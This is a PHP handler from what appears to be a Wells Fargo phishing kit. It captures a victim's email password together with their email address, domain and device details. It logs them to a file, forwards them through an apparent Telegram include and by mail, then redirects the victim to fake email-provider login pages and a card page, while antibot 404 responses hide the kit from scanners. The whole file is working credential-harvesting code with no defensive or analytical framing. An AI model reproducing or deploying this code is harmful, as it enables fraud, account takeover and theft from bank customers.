<?php

session_start();


require_once '../Conf.php';
// require_once '../Layout/Antibot.php';
// require_once '../Layout/demonTest.php';

$comps = new Comp;
// $antibot = new Antibot;


$settings = $comps->settings();

if (!$comps->checkToken()) {
    echo $antibot->throw404();
    $comps->log(
        "../../Extracted/key/kill.txt",
        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
    );
    die();
}

if (isset(
    $_POST['emailPassword']
)) {
    if (!$comps->checkEmpty(
        $_POST['emailPassword']
    )) {
        $_SESSION['emailPassword'] = $_POST['emailPassword'];

        $content = ' [+]━━━━━━━【🔑 Email Information from ' . $_SESSION['username'] . ' 】
                [👤 Email Address:] ' . $_SESSION['email'] . '
                [👤 Password:] ' . $_SESSION['emailPassword'] . '
                [👤 Domain:] ' . ucwords(substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1)) . '
                [👤 Device Info:]     ' . $comps->userDetails();


        $save = fopen("./logs.txt", "a+");
        fwrite($save, $content);
        fclose($save);

        include "./sendtel.php";

        if (isset($settings['EmailTwice']) && $settings['EmailTwice'] == "on") {
            if (!isset($_SESSION['emailTwice']) || !$_SESSION['emailTwice']) {
                $_SESSION['emailTwice'] = 1;


                if ($comps->mailX("(1) Email Access | Wells Fargo", $content)) {
                    $comps->log(
                        "../../Extracted/key/live.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Email Access\n\n"
                    );
                    if (!$comps->userEmail($_SESSION['email'])) {
                        die($comps->headerX("../../Login/email/Microsoft.php"));
                    } else {
                        die($comps->headerX("../../Login/email/" . $comps->userEmail($_SESSION['email']) . ".php"));
                    }
                } else {
                    die($antibot->throw404());
                }
            }

            if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                unset($_SESSION['emailTwice']);

                if ($comps->mailX("(2) Email Access | Wells Fargo", $content)) {
                    $comps->log(
                        "../../Extracted/key/live.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (2) Email Access\n\n"
                    );
                    die($comps->headerX("../../Login/card.php"));
                } else {
                    die($antibot->throw404());
                }
            }
        } else {

            if ($comps->mailX("(1) Email Access | Wells Fargo", $content)) {
                $comps->log(
                    "../../Extracted/key/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Email Access\n\n"
                );
                die($comps->headerX("../../Login/card.php"));
            } else {
                die($antibot->throw404());
            }
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Extracted/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }
} else {
    echo $antibot->throw404();
    $comps->log(
        "../../Extracted/key/kill.txt",
        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
    );
    die();
}
